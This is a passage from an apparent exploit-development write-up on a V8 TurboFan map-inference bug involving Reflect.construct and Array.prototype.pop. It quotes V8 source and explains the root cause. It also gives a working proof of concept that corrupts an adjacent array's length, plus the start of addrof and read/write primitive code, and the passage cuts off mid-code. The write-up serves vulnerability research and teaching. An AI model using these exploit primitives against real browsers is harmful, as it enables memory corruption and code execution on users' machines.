</span></span><span class="line"><span class="cl">    <span class="nx">JSHeapBroker</span><span class="o">*</span> <span class="nx">broker</span><span class="p">,</span> <span class="nx">Node</span><span class="o">*</span> <span class="nx">receiver</span><span class="p">,</span> <span class="nx">Node</span><span class="o">*</span> <span class="nx">effect</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">ZoneHandleSet</span><span class="o">&lt;</span><span class="nx">Map</span><span class="o">&gt;*</span> <span class="nx">maps_return</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">HeapObjectMatcher</span> <span class="nx">m</span><span class="p">(</span><span class="nx">receiver</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">m</span><span class="p">.</span><span class="nx">HasValue</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">HeapObjectRef</span> <span class="nx">receiver</span> <span class="o">=</span> <span class="nx">m</span><span class="p">.</span><span class="nx">Ref</span><span class="p">(</span><span class="nx">broker</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// We don&#39;t use ICs for the Array.prototype and the Object.prototype
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// because the runtime has to be able to intercept them properly, so
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// we better make sure that TurboFan doesn&#39;t outsmart the system here
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// by storing to elements of either prototype directly.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">receiver</span><span class="p">.</span><span class="nx">IsJSObject</span><span class="p">()</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">        <span class="o">!</span><span class="nx">broker</span><span class="o">-&gt;</span><span class="nx">IsArrayOrObjectPrototype</span><span class="p">(</span><span class="nx">receiver</span><span class="p">.</span><span class="nx">AsJSObject</span><span class="p">()))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">receiver</span><span class="p">.</span><span class="nx">map</span><span class="p">().</span><span class="nx">is_stable</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// The {receiver_map} is only reliable when we install a stability
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// code dependency.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">*</span><span class="nx">maps_return</span> <span class="o">=</span> <span class="nx">ZoneHandleSet</span><span class="o">&lt;</span><span class="nx">Map</span><span class="o">&gt;</span><span class="p">(</span><span class="nx">receiver</span><span class="p">.</span><span class="nx">map</span><span class="p">().</span><span class="nx">object</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">kUnreliableReceiverMaps</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nx">InferReceiverMapsResult</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">kReliableReceiverMaps</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="nx">effect</span><span class="o">-&gt;</span><span class="nx">opcode</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="nx">IrOpcode</span><span class="o">::</span><span class="nx">kJSCreate</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">IsSame</span><span class="p">(</span><span class="nx">receiver</span><span class="p">,</span> <span class="nx">effect</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">base</span><span class="o">::</span><span class="nx">Optional</span><span class="o">&lt;</span><span class="nx">MapRef</span><span class="o">&gt;</span> <span class="nx">initial_map</span> <span class="o">=</span> <span class="nx">GetJSCreateMap</span><span class="p">(</span><span class="nx">broker</span><span class="p">,</span> <span class="nx">receiver</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="nx">initial_map</span><span class="p">.</span><span class="nx">has_value</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="o">*</span><span class="nx">maps_return</span> <span class="o">=</span> <span class="nx">ZoneHandleSet</span><span class="o">&lt;</span><span class="nx">Map</span><span class="o">&gt;</span><span class="p">(</span><span class="nx">initial_map</span><span class="o">-&gt;</span><span class="nx">object</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="c1">// We reached the allocation of the {receiver}.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="k">return</span> <span class="nx">kNoReceiverMaps</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="c1">//result = kUnreliableReceiverMaps;  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="c1">// ^ applied patch: JSCreate can have a side-effect.        
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>In this function, we can focus on the switch case nested in a while loop that transverses the effect chain. Each case in the switch case consists of specific nodes denoting Ignition opcodes relevant for map inference, in particular the opcode <code>IrOpcode::kJSCreate</code>.</p>
<p>This opcode will be generated for the invocation of <code>Reflect.construct</code>. Eventually, the while loop will run out of nodes to check and will fail to find an effect node with a map similar to the one of the receiver since the receiver map was changed via the <code>Proxy</code> function invocation in <code>Reflect.construct</code>. However, the function will still return a result of <code>kReliableReceiverMaps</code> despite having the receiver&rsquo;s map not being reliable.</p>
<p>We can see the patch applied to this function commented out, highlighting where the vulnerability resides. The invocation of <code>Reflect.construct</code> will in fact be able to change the maps of the receiver node, in this case the <code>JSArray</code> <code>a</code>. However, due to a logical error, <code>NodeProperties::InferReceiverMapsUnsafe</code> will fail to mark this node as <code>kUnreliableReceiverMaps</code>, as to denote that the receiver maps may have changed.</p>
<p>The implications of not marking this node as unreliable will become clear by the result of the invokation of <code>MapInference::RelyOnMapsPreferStability</code> by <code>JSCallReducer::ReduceArrayPrototypePop</code> shown below:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">bool</span> <span class="nx">MapInference</span><span class="o">::</span><span class="nx">RelyOnMapsPreferStability</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="nx">CompilationDependencies</span><span class="o">*</span> <span class="nx">dependencies</span><span class="p">,</span> <span class="nx">JSGraph</span><span class="o">*</span> <span class="nx">jsgraph</span><span class="p">,</span> <span class="nx">Node</span><span class="o">**</span> <span class="nx">effect</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Node</span><span class="o">*</span> <span class="nx">control</span><span class="p">,</span> <span class="kr">const</span> <span class="nx">FeedbackSource</span><span class="o">&amp;</span> <span class="nx">feedback</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">CHECK</span><span class="p">(</span><span class="nx">HaveMaps</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">Safe</span><span class="p">())</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">RelyOnMapsViaStability</span><span class="p">(</span><span class="nx">dependencies</span><span class="p">))</span> <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nx">CHECK</span><span class="p">(</span><span class="nx">RelyOnMapsHelper</span><span class="p">(</span><span class="nx">nullptr</span><span class="p">,</span> <span class="nx">jsgraph</span><span class="p">,</span> <span class="nx">effect</span><span class="p">,</span> <span class="nx">control</span><span class="p">,</span> <span class="nx">feedback</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">bool</span> <span class="nx">MapInference</span><span class="o">::</span><span class="nx">RelyOnMapsHelper</span><span class="p">(</span><span class="nx">CompilationDependencies</span><span class="o">*</span> <span class="nx">dependencies</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                    <span class="nx">JSGraph</span><span class="o">*</span> <span class="nx">jsgraph</span><span class="p">,</span> <span class="nx">Node</span><span class="o">**</span> <span class="nx">effect</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                    <span class="nx">Node</span><span class="o">*</span> <span class="nx">control</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                    <span class="kr">const</span> <span class="nx">FeedbackSource</span><span class="o">&amp;</span> <span class="nx">feedback</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">Safe</span><span class="p">())</span> <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">auto</span> <span class="nx">is_stable</span> <span class="o">=</span> <span class="p">[</span><span class="k">this</span><span class="p">](</span><span class="nx">Handle</span><span class="o">&lt;</span><span class="nx">Map</span><span class="o">&gt;</span> <span class="nx">map</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">MapRef</span> <span class="nx">map_ref</span><span class="p">(</span><span class="nx">broker_</span><span class="p">,</span> <span class="nx">map</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">map_ref</span><span class="p">.</span><span class="nx">is_stable</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">};</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">dependencies</span> <span class="o">!=</span> <span class="nx">nullptr</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">      <span class="nx">std</span><span class="o">::</span><span class="nx">all_of</span><span class="p">(</span><span class="nx">maps_</span><span class="p">.</span><span class="nx">cbegin</span><span class="p">(),</span> <span class="nx">maps_</span><span class="p">.</span><span class="nx">cend</span><span class="p">(),</span> <span class="nx">is_stable</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nx">Handle</span><span class="o">&lt;</span><span class="nx">Map</span><span class="o">&gt;</span> <span class="nx">map</span> <span class="o">:</span> <span class="nx">maps_</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">dependencies</span><span class="o">-&gt;</span><span class="nx">DependOnStableMap</span><span class="p">(</span><span class="nx">MapRef</span><span class="p">(</span><span class="nx">broker_</span><span class="p">,</span> <span class="nx">map</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SetGuarded</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">feedback</span><span class="p">.</span><span class="nx">IsValid</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">InsertMapChecks</span><span class="p">(</span><span class="nx">jsgraph</span><span class="p">,</span> <span class="nx">effect</span><span class="p">,</span> <span class="nx">control</span><span class="p">,</span> <span class="nx">feedback</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can observe that a call to <code>MapInference::Safe()</code> will be done, and if succesful, the function will return immediately. The implementation of this function is the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">bool</span> <span class="nx">MapInference</span><span class="o">::</span><span class="nx">Safe</span><span class="p">()</span> <span class="kr">const</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">maps_state_</span> <span class="o">!=</span> <span class="nx">kUnreliableNeedGuard</span><span class="p">;</span> <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Because the <code>JSCreate</code> node was never marked as <code>kUnreliableReceiverMaps</code>, this function will always return true. This comparative operation can be shown below.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">maps_state_</span> <span class="o">=</span> <span class="p">(</span><span class="nx">result</span> <span class="o">==</span> <span class="nx">NodeProperties</span><span class="o">::</span><span class="nx">kUnreliableReceiverMaps</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="o">?</span> <span class="nx">kUnreliableDontNeedGuard</span>
</span></span><span class="line"><span class="cl">                    <span class="o">:</span> <span class="nx">kReliableOrGuarded</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The code path that should mitigate this vulnerability is the one in which the function <code>InsertMapChecks</code> is invoked. This function will be in charge to add a <code>CheckMaps</code> node before the effect nodes loading and storing the popped element from the receiver object takes place, assuring that a correct map will be used for these operations.</p>
<p>We can see that if we invoke <code>Reflect.construct</code> outside the context of <code>Array.prototype.pop</code>, a <code>CheckMaps</code> node is inserted, as it should for the conventional use of this function:</p>
<div style="text-align:center"><img src ="https://tmpout.sh/2/img/Pasted%20image%2020220112204523.png" /></div>
<p>However, if the invocation of <code>Reflect.construct</code> is within <code>Array.protoype.pop</code> context, this will trigger the vulnerability and Turbofan will assume that the map of the receiver object is reliable and will not add a <code>CheckMaps</code> node as show below:</p>
<div style="text-align:center"><img src ="https://tmpout.sh/2/img/Pasted%20image%2020220112204615.png" /></div>
<br />
<hr>
<h3 id="exploit-strategy">Exploit Strategy</h3>
<p>As previously mentioned, this vulnerability allows us to trivially craft <code>addrof</code> and <code>fakeobj</code> primitives. A common technique to exploit the current scenario, in which only <code>addrof</code> and <code>fakeobj</code> primitives are available without OOB read/write, is by crafting a fake <code>ArrayBuffer</code> object with an arbitrary backing pointer. However, this approach becomes difficult with V8&rsquo;s <a href="https://v8.dev/blog/pointer-compression">pointer compression</a> enabled since <a href="https://v8.dev/blog/v8-release-80">version 8.0</a>.</p>
<p>This is because with pointer compression, tagged pointers are stored within V8&rsquo;s heap as <code>dwords</code>, while double values are stored as <code>qwords</code>. This implicitly impacts our ability to create an effective <code>fakeobj</code> primitive for this specific scenario.</p>
<p><em>If you are interested in knowing how this exploit would look like without pointer compression here is a really nice writeup by <a href="https://leethax0.rs/2021/04/ElectricChrome/">@HawaiiFive0day</a>.</em></p>
<p>In order to exploit this vulnerability, we have to use a different approach that will leverage the mechanics of V8&rsquo;s pointer compression to our advantage.</p>
<p>As previously mentioned, when a new indexed property of different <em>elements kind</em> gets stored into array <code>a</code>, the array will be reallocated, and their elements updated corresponding to the new array&rsquo;s <em>elements kind</em> transition.</p>
<p>However, this leaves for an interesting caveat that is useful for absuing pointer compression-enabled element transitioning. If the elements of the subject array are originally of elements kind <code>PACKED_DOUBLE_ELEMENTS</code> and this array is transitioning to <code>PACKED_ELEMENTS</code>, this will ultimately create an array half of the size of the original one, since <code>PACKED_ELEMENTS</code> corresponds to elements stored as <code>dword</code> tagged pointers when pointer compression is enabled, in contrast to double values stored as <code>qwords</code> as previously mentioned.</p>
<p>Since the map inference of the array is incorrect after the array has transitioned to <code>PACKED_ELEMENTS</code> and any <code>JSArray</code> builtin function is subject to this wrong map inference, we can abuse this scenario to achieve OOB read/write via the use of <code>Array.prototype.pop</code> and <code>Array.prototype.push</code>.</p>
<p>However, there is a more convenient avenue for exploitation documented by <a href="https://blog.exodusintel.com/2020/02/24/a-eulogy-for-patch-gapping-chrome/">Exodus Intelligence</a>. Instead of recurrently using <code>JSArray</code> builtin functions as <code>Array.prototype.pop</code> and <code>Array.prototype.push</code> to read and write memory, a single OOB write can be leveraged to overwrite the length field of an adjacent array in memory. This will enable an easier approach to build stronger primitives moving forward. Here is a PoC for this exploitation strategy:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,</span><span class="mf">1.1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">empty</span><span class="p">()</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">f</span><span class="p">(</span><span class="nx">nt</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">a</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Reflect</span><span class="p">.</span><span class="nx">construct</span><span class="p">(</span><span class="nx">empty</span><span class="p">,</span> <span class="nx">arguments</span><span class="p">,</span> <span class="nx">nt</span><span class="p">))</span> <span class="o">===</span> <span class="nb">Proxy</span>
</span></span><span class="line"><span class="cl">           <span class="o">?</span> <span class="mf">2.2</span>
</span></span><span class="line"><span class="cl">           <span class="o">:</span> <span class="mf">2261634.000029185</span> <span class="c1">//0x414141410000f4d2 -&gt; 0xf4d2 = 31337 * 2
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">p</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Proxy</span><span class="p">(</span><span class="nb">Object</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">get</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl">        <span class="nx">b</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">main</span><span class="p">(</span><span class="nx">o</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">f</span><span class="p">(</span><span class="nx">o</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">PrepareFunctionForOptimization</span><span class="p">(</span><span class="nx">empty</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">PrepareFunctionForOptimization</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">PrepareFunctionForOptimization</span><span class="p">(</span><span class="nx">main</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">(</span><span class="nx">empty</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">(</span><span class="nx">empty</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">OptimizeFunctionOnNextCall</span><span class="p">(</span><span class="nx">main</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">(</span><span class="nx">p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">b</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>   <span class="c1">// prints 31337
</span></span></span></code></pre></td></tr></table>
</div>
</div><br />
<hr>
<h2 id="achieving-relative-arbitrary-readwrite">Achieving Relative Arbitrary Read/Write</h2>
<p>Once we have achieved OOB read/write and successfully overwritten the length of an adjacent array, we can now read/write into adjacent memory.</p>
<p>From this point forward, we can neglect the original vulnerability, and think of the next sections independently of the specific vulnerability as long as we can achive OOB read/write from a JSArray with <code>PACKED_DOUBLE_ELEMENTS</code> <em>elements kind</em>.</p>
<p>In order to read/write memory with more flexibility, we need to build a set of read/write primitives as well as to gain the ability to retrieve the address of arbitrary objects via an <code>addrof</code> primitive.</p>
<p>This can be done by replacing the value of the elements tagged pointer of an adjacent double array (<code>c</code>) via our OOB double array (<code>b</code>). If we replace the value of this field we will be able to dereference its contents while accessing the elements of <code>c</code>, ultimately enabling us to read or write to tagged pointers.</p>
<p>In addition, an <code>addrof</code> primitive can be achieved by leaking the maps of adjacent boxed/unboxed arrays, and interchanging these also in an adjacent double array.</p>
<p>The implementation of these primitives having our preliminar OOB access can be shown as follows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,</span><span class="mf">1.1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl"><span class="c1">//triggering Turbofan side-effect bug leveraging OOB write to b
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">oob</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="c1">// adjacent OOB-accesible arrays from double array b
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="p">[{},</span> <span class="p">{}];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//leaking maps of boxed/unboxed adjacent arrays
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">flt_map</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">b</span><span class="p">[</span><span class="mi">14</span><span class="p">])</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">obj_map</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">b</span><span class="p">[</span><span class="mi">25</span><span class="p">])</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">tmp</span> <span class="o">=</span> <span class="nx">b</span><span class="p">[</span><span class="mi">14</span><span class="p">];</span> <span class="c1">// accesing array c&#39;s map tagged pointer    
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">tmp_elm</span> <span class="o">=</span> <span class="nx">c</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// overwritting only higher dword
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">b</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(((</span><span class="nx">obj_map</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">tmp</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">)));</span>
